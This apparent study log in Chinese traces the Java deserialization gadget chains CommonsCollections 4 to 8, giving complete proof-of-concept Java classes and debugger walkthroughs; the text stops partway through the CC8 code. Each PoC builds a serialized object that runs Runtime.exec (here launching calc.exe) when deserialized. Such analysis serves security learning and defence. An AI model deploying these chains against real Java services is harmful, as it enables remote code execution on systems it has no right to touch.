CC4是CC2和CC3的结合.

```
package CC4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC3");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] { Templates.class },new Object[] { obj } )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        TransformingComparator comparator = new TransformingComparator(chainedTransformer);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        setFieldValue(queue,"comparator",comparator);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();

    }
}
```

在`PriorityQueue#readObject` 下断点，

![image-20220116202616580](img/image-20220116202616580.png)![image-20220116202616580](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116202616580.png?lastModify=1646033842)

跟进`heapify`,然后跟进`siftDown`,继续跟进`siftDownUsingComparator`，此时`comparator` 为`TransformingComparator` ,

![image-20220116202857754](img/image-20220116202857754.png)![image-20220116202857754](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116202857754.png?lastModify=1646033842)

跟进`TransformingComparator#compare` 方法，，此时`this.transformer` 之前`new TransformingComparator(chainedTransformer)` 传进来的`chainedTransformer`

![image-20220116202934132](img/image-20220116202934132.png)![image-20220116202934132](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116202934132.png?lastModify=1646033842)

那么跟进`chainedTransformer#transform` ,最终调用`InstantiateTransformer#transform` ，参数为`TrAXFilter`,

![image-20220116203219512](img/image-20220116203219512.png)![image-20220116203219512](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116203219512.png?lastModify=1646033842)

反射获取`TrAXFilter` 参数为`Class`类的构造函数，实例化，

![image-20220116203547119](img/image-20220116203547119.png)![image-20220116203547119](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116203547119.png?lastModify=1646033842)

跟到`TrAXFilter` 的构造函数，

![image-20220116203831978](img/image-20220116203831978.png)![image-20220116203831978](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116203831978.png?lastModify=1646033842)

`templates` 为`TemplatesImpl` ,那么跟进它的`newTransformer` 方法

![image-20220116204042180](img/image-20220116204042180.png)![image-20220116204042180](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116204042180.png?lastModify=1646033842)

和之前的一样了，一步步到最后加载字节码实例化。

# CommonsCollection5

```
This only works in JDK 8u76 and WITHOUT a security manager
```

需要JDK1.8版本，并且关闭`SecurityManager` 。

```
commons.collections3.1
```

`SecurityManager`也就是java的安全管理器，当运行未知的Java程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用Java安全管理器。该管理器默认是关闭的。

## POC

这条链相当于CC1的高版本链，CC1中需要找到调用`LazyMap#get`，CC1找到的`AnnotationInvocationHandler`，在jdk8u71 过后，已经改变了readObject的逻辑导致高版本不可用。

而CC5重新找到了一个可以在JDK高版本调用`LazyMap#get`的类。(当调用get方法的时候，就会调用到`ChainedTransformer`的`transform`f方法)。

找到的类是`org.apache.commons.collections.keyvalue.TiedMapEntry` ，

在其`getValue` 方法中可以调用`map.get`

![image-20220116205831688](img/image-20220116205831688.png)![image-20220116205831688](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116205831688.png?lastModify=1646033842)

而在其`toString`方法有调用了`getValue`

![image-20220116210005789](img/image-20220116210005789.png)![image-20220116210005789](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116210005789.png?lastModify=1646033842)

但是怎么去调用这个`toString`方法呢，

我们找到了`BadAttributeValueExpException` 类的`readObject`方法

![image-20220116210224926](img/image-20220116210224926.png)![image-20220116210224926](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116210224926.png?lastModify=1646033842)

这里·`valObj`是通过反射获取它的字段`private Object val` 。

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
package cc5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer fakeChainedTransformer = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });

        //ChainedTransformer  chainedTransformer= new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();

        Map outerMap = LazyMap.decorate(innerMap, fakeChainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "foo");
//        outerMap.remove("foo");
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedMapEntry);

        setFieldValue(fakeChainedTransformer,"iTransformers",transformers);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(poc);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();

    }
}
```

## 调试

调试的时候发现，如果main里断点达到,此行以下，

```
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
```

然后调试会进不去，`LazyMap#get` 方法里的 if 判断。

```
 if (map.containsKey(key) == false)
```

如果断点直接打到if这里就可以进去。

这里应该是 idea在调试时做的一些操作，我们设置一下：

![image-20220117154521968](img/image-20220117154521968.png)![image-20220117154521968](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117154521968.png?lastModify=1646033842)

将断点打到`BadAttributeValueExpException#readObject` 方法，获取到其`val` 值

![image-20220117155045014](img/image-20220117155045014.png)![image-20220117155045014](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155045014.png?lastModify=1646033842)

```
System.getSecurityManager()` 关闭，进入 if ，跟进`toString` 也就是`TiedMapEntry#toString
```

![image-20220117155216903](img/image-20220117155216903.png)![image-20220117155216903](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155216903.png?lastModify=1646033842)

继续跟进`getValue`方法

![image-20220117155305421](img/image-20220117155305421.png)![image-20220117155305421](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155305421.png?lastModify=1646033842)

继续跟进`map.get(key)` ， `map` 为构造poc传入的`outerMap`,`key`为传入的值`foo` ，key可任意指定

![image-20220117155416561](img/image-20220117155416561.png)![image-20220117155416561](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155416561.png?lastModify=1646033842)

跟进`factory.transform` ，`factory` 为传入的`ChainedTransformer` 对象，

![image-20220117155814849](img/image-20220117155814849.png)![image-20220117155814849](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155814849.png?lastModify=1646033842)

接下来就是调用几个`Transformer` 的 `transform` 方法了，和前面的一样，就不写了。

![image-20220117155911673](img/image-20220117155911673.png)![image-20220117155911673](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117155911673.png?lastModify=1646033842)

成功

![image-20220117160113369](img/image-20220117160113369.png)![image-20220117160113369](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117160113369.png?lastModify=1646033842)

# CommonsCollections6

其实这个和CC5差不多，

CC5是用`TiedMapEntry#toString`去调用`getVlaue` 然后调用`LazyMap#get` 方法的，

而CC6使用`TiedMapEntry#hashCode` 去调用`getValue` 。

后面的链都一样，而前面的链需要找到调用`TiedMapEntry#hashCode` 的部分，连起来就可以。

而前面分析过的CC链中，`HashMap` 中 `put`  ---> `hash` ---> `key.hashCode` ，key可控，那么就可以连起来了。

![image-20220117163227427](img/image-20220117163227427.png)![image-20220117163227427](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117163227427.png?lastModify=1646033842)

![image-20220117163303506](img/image-20220117163303506.png)![image-20220117163303506](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117163303506.png?lastModify=1646033842)

新引入了`HashSet` ，`HashSet#readObject` 中调用了`map.put` ，map 可控， 

![image-20220117165840057](img/image-20220117165840057.png)![image-20220117165840057](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117165840057.png?lastModify=1646033842)

那么都可以连起来了。

## POC

ysoserial中给的链是

```
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
package cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer fakeChainedTransformer = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
//        Transformer fakeChainedTransformer = new ChainedTransformer(transformers);


        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeChainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "foo");

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);
        outerMap.remove("foo");
        
        setFieldValue(fakeChainedTransformer,"iTransformers",transformers);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashSet);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();

    }
}
```

## 分析

跟进`HashSet` ，

![image-20220117183822999](img/image-20220117183822999.png)![image-20220117183822999](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117183822999.png?lastModify=1646033842)

构造函数为新建一个HashMap，

![image-20220117183845805](img/image-20220117183845805.png)![image-20220117183845805](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117183845805.png?lastModify=1646033842)

然后`tiedMapEntry` 添加进上边新建的 HashMap , key 为 恶意对象`tiedMapEntry` ，`PRESENT` 为新建的`new Object();`,此时`tiedMapEntry`参数`fakeChainedTransformer` 还不是恶意的。

```
hashSet.add(tiedMapEntry);
```

![image-20220117183924762](img/image-20220117183924762.png)![image-20220117183924762](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117183924762.png?lastModify=1646033842)

跟进`HashMap#put`， 此时`map` 为新建`HashSet` 时的新建的HashMap，

```
 map = new HashMap<>(initialCapacity);
```

![image-20220117184139949](img/image-20220117184139949.png)![image-20220117184139949](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117184139949.png?lastModify=1646033842)

**跟进`put` 之后，结合之前CC链的调试，我们发现这里会执行一次我们构建的poc，跟下去**

跟进`hash(key)` ， key为传进来的`tiedMapEntry`，

![image-20220117184330222](img/image-20220117184330222.png)![image-20220117184330222](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117184330222.png?lastModify=1646033842)

跟进`key.hashCode()` ，key为传进来的`tiedMapEntry`

![image-20220117184510080](img/image-20220117184510080.png)![image-20220117184510080](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220117184510080.png?lastModify=1646033842)

跟进`getValue` ；这里 map 为之前新建TiedMapEntry对象传进来的`outerMap` ，这里的 key为之前传进来的`foo` ，

```
TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "foo");
```

![image-20220120104849305](img/image-20220120104849305.png)![image-20220120104849305](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120104849305.png?lastModify=1646033842)

跟进`map.get` ，`map` 为之前创建的`LazyMap`对象`outerMap` ，`key` 为`Object key` foo，

此时`outerMap` 中没有`key` 为 `foo` ，

![image-20220120105039079](img/image-20220120105039079.png)![image-20220120105039079](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120105039079.png?lastModify=1646033842) 

所以跳进if, 这里就不跟进`factory.transform(key);` ,`factory` 为`fakeChainedTransformer` , key 仍为 foo ，

前面分析了好多遍，因为我们没有使用真正的 paylaod ，所以此处并没有弹出计算器。继续接下来的操作，

```
map.put(key, value);
```

这里为属性`map` 添加了一对键值对 ，`key` 为 foo ，那么联想下次反序列化进入这里时，将不会进入该 if 判断，因为我们现在构造poc的过程中进来过一次，并且将 foo 作为 key 添加进去，导致 `map.containsKey(key)=true` 。

回到主函数，所以我们手动移除了 foo，让其可以进入 if 循环。

![image-20220120105727047](img/image-20220120105727047.png)![image-20220120105727047](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120105727047.png?lastModify=1646033842)

接下来，把真正的恶意对象反射赋值，

![image-20220120105831176](img/image-20220120105831176.png)![image-20220120105831176](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120105831176.png?lastModify=1646033842)

就 ok了。

## 调试

在`HashSet#readObject` 打断点，

![image-20220118193445579](img/image-20220118193445579.png)![image-20220118193445579](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193445579.png?lastModify=1646033842)

会调用`HashMap#put` ,跟进, `e` 为`tiedMapEntry` 对象

![image-20220118193513439](img/image-20220118193513439.png)![image-20220118193513439](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193513439.png?lastModify=1646033842)

跟进`hash(key)` ,key为 tiedMapEntry ,

![image-20220118193641101](img/image-20220118193641101.png)![image-20220118193641101](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193641101.png?lastModify=1646033842)

跟进`key.hashCode()` ，也就是`TiedMapEntry#hashCode` ，

![image-20220118193713748](img/image-20220118193713748.png)![image-20220118193713748](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193713748.png?lastModify=1646033842)

跟进`getValue`

![image-20220118193803905](img/image-20220118193803905.png)![image-20220118193803905](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193803905.png?lastModify=1646033842)

继续跟进`map.get`

![image-20220118193752902](img/image-20220118193752902.png)![image-20220118193752902](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220118193752902.png?lastModify=1646033842)

这里 poc 中移除了上一次`map.put(key, value);` 添加进去的 key ，所以这里可以进入 if ,

![image-20220120110329690](img/image-20220120110329690.png)![image-20220120110329690](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120110329690.png?lastModify=1646033842)

那么接下来就是调用`trasform` 函数执行命令了。就不重复分析了。

## POC2

P神给出的 poc 并没有使用`HashSet` ，而是直接使用了`HashMap` ,

因为在`HashMap`的`readObject` 中也调用了`hash(key)`

![image-20220120110826412](img/image-20220120110826412.png)![image-20220120110826412](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120110826412.png?lastModify=1646033842)

跟进`hash(key)` ,调用`key.hashCode()` ，就跟后面的连接上了YYDS

![image-20220120110844103](img/image-20220120110844103.png)![image-20220120110844103](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120110844103.png?lastModify=1646033842)

```
package cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Demo2 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# CommonsCollections7链

ysoserial中给出的链

```
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```

## poc

```
package cc7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{"calc"};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();
    }
}
```

## 分析

CC7仍使用了`LazyMap` 来构造利用链，不同的是CC7使用`Hashtable` 来触发LazyMap利用链，最终执行核心代码。

> 但是为什么需要是实例化两个`HashMap` ，将被修饰为两个`LazyMap` ，然后分别添加到`Hashtable` 中？

根据调用链，可知道`readObject` ---> `reconstitutionPut` --> `equals` ，然后调用到`LazyMap#get` 。

![image-20220120124324884](img/image-20220120124324884.png)![image-20220120124324884](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120124324884.png?lastModify=1646033842)

进入`Hashtable#reconstitutionPut` 中，这里是循环，第一次不会进入 for循环，因为此时`tab[index]`为 null,

```
private transient Entry<?,?>[] table;
```

![image-20220120124243426](img/image-20220120124243426.png)![image-20220120124243426](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120124243426.png?lastModify=1646033842)

然后新建一个`Entry` 对象，将其赋值给`tab[indx]`

```
new Entry<>(hash, key, value, e)
```

然后第二次·进来的时候就可以进入for循环，从而调用到`e.key.equals` 。

所以需要两次 put。

这里 remove 的原因和CC6差不多。

```
lazyMap2.remove("yy");
```

## 调试

在`Hashtable#readObject` 打断点，跟进，会调用到`reconstitutionPut`

![image-20220120125342019](img/image-20220120125342019.png)![image-20220120125342019](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120125342019.png?lastModify=1646033842)

跟进`reconstitutionPut`

参数1： `new Entry<?,?>[length];` 是空的

参数2：poc传入的 lazyMap1

参数2：poc传入的 1

此时`tab[index]` 为 null ，所以不进入 for 循环

![image-20220120125628166](img/image-20220120125628166.png)![image-20220120125628166](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120125628166.png?lastModify=1646033842)

接下来为`tab[index]`实例化对象赋值，

key:  lazyMap1

value:  1

![image-20220120125723360](img/image-20220120125723360.png)![image-20220120125723360](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120125723360.png?lastModify=1646033842)

回到这里，循环，重新进入`reconstitutionPut`

![image-20220120125822107](img/image-20220120125822107.png)![image-20220120125822107](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120125822107.png?lastModify=1646033842)

和上次不同的是，此时 table已经有了值。

跟进`reconstitutionPut` ，可进入 for循环，

![image-20220120142739640](img/image-20220120142739640.png)![image-20220120142739640](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120142739640.png?lastModify=1646033842)

跟进`e.key.equals` ，`e.key` 为 lazyMap1 , 参数`key` 为 lazyMap2。

![image-20220120143044646](img/image-20220120143044646.png)![image-20220120143044646](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120143044646.png?lastModify=1646033842)

继续跟进`map.equals` ， map为 innerMap1 ,object为 lazyMap2

![image-20220120143343328](img/image-20220120143343328.png)![image-20220120143343328](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120143343328.png?lastModify=1646033842)

跟进`m.get` ,m 为 lazyMap2 , key 为 yy

![image-20220120143539679](img/image-20220120143539679.png)![image-20220120143539679](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120143539679.png?lastModify=1646033842)

lazyMap2 的 key 中不含 yy ，

进入 if 判断，然后就跟之前的分析重复了。

https://www.cnblogs.com/nice0e3/p/13910833.html

# CommonsCollections8

链接：https://github.com/frohoff/ysoserial/pull/116/commits/5a14762f051ef8b499941f4bfdf8ac62827dd161

看下链：

```
/*
	Gadget chain:
        org.apache.commons.collections4.bag.TreeBag.readObject
        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
        java.util.TreeMap.put
        java.util.TreeMap.compare
        org.apache.commons.collections4.comparators.TransformingComparator.compare
        org.apache.commons.collections4.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
            ... (TemplatesImpl gadget)
        java.lang.Runtime.exec
 */
```

## poc

```
package cc8;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;


public class CC8Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC8");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        // setup harmless chain
